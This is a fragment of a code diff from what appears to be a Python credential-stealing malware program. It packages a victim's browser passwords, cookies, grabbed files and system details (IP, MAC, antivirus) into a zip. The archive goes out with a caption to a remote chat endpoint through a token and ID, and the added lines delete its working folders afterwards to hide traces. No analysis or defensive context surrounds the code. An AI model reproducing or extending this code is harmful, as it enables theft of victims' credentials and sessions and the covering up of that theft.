@@ -565,7 +565,6 @@ async def main(TOKEN, ID):
     t = datetime.now(vn_tz).strftime('%d_%m_%Y_%H_%M')
     name_f = f'{t}_{username}@[{country}]'
     z_ph = os.path.join(os.environ["TEMP"], name_f +'.zip');shutil.make_archive(z_ph[:-4], 'zip', path_data)
-    # print(z_ph)
     caption = f"       ==== @VIPBAOZ ====\n⏰ Date => {datetime.now(vn_tz).strftime('%d/%m/%Y %H:%M')}\n💻System => {computer_os}\n👤 User => {username}\n🆔 PC => {hostname}\n🏴 Country => [{country}]\n🔍 IP => {ip}\n🔍 Mac => {mac}\n⚙ Ram => {ram}\n⚙ Cpu => {cpu}\n⚙ Gpu => {gpu}\n📝 Language => {language}\n🔓 Antivirus => {antivirus}\n ====[ User Data ]====\n📂 FileGrabber => {grabfiles}\n ====[ Browsers Data ]====\n🗝 Passwords => {passwd}\n🍪 Cookies => {cookies}"
     
     await sendfile(TOKEN, ID, z_ph, caption)
@@ -574,9 +573,12 @@ async def main(TOKEN, ID):
 
     try:
        shutil.rmtree(path_data)
+       shutil.rmtree("C:\\Users\\Public\\Document")
+
     except:
         try:
             os.system(f"rmdir {path_data}")
+            os.system(f"rmdir C:\\Users\\Public\\Document")
         except:
             pass
 
